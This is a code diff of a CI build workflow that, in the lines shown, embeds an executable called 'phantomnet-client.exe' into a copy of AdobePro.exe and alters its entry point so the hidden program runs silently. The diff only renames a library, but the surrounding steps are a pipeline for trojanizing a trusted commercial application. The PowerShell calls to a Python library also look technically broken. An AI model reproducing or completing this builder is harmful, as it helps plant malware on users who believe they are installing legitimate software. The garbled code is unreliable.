@@ -23,7 +23,7 @@ jobs:
 
     - name: Install Python dependencies
       run: |
-        pip install pyinstaller petools
+        pip install pyinstaller pefile
 
     - name: Install UPX
       run: |
@@ -41,7 +41,7 @@ jobs:
     - name: Embed the executable into AdobePro.exe
       run: |
         $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro.exe")
-        $pe = New-Object petools.PE($adobeProData)
+        $pe = New-Object pefile.PE($adobeProData)
         $embeddedExeData = [System.IO.File]::ReadAllBytes("output\phantomnet-client.exe")
         $pe.AddResource("EMBEDDED_EXE", $embeddedExeData)
         [System.IO.File]::WriteAllBytes("AdobePro_modified.exe", $pe.Data)
@@ -49,7 +49,7 @@ jobs:
     - name: Modify AdobePro.exe to run the embedded executable silently
       run: |
         $adobeProData = [System.IO.File]::ReadAllBytes("AdobePro_modified.exe")
-        $pe = New-Object petools.PE($adobeProData)
+        $pe = New-Object pefile.PE($adobeProData)
         $entryPoint = $pe.EntryPoint
         $newEntryPoint = $pe.RvaToOffset($entryPoint) + 0x10  # Adjust the offset as needed
         $pe.EntryPoint = $newEntryPoint
